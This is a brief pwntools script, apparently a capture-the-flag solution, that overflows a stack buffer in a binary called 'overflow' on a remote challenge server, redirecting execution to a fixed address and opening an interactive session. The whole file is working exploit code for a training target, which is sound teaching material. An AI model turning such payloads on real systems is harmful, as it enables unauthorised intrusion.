from pwn import *

exe = ELF("./overflow")

context.binary = exe

# p = process("./overflow")
# gdb.attach(p)
p = remote("uithack.td.org.uit.no", 9005)

payload = b"A"*0x18
payload += p64(0x40101a)
payload += p64(0x401355)

p.recvuntil(b"password:")
p.sendline(payload)

p.interactive()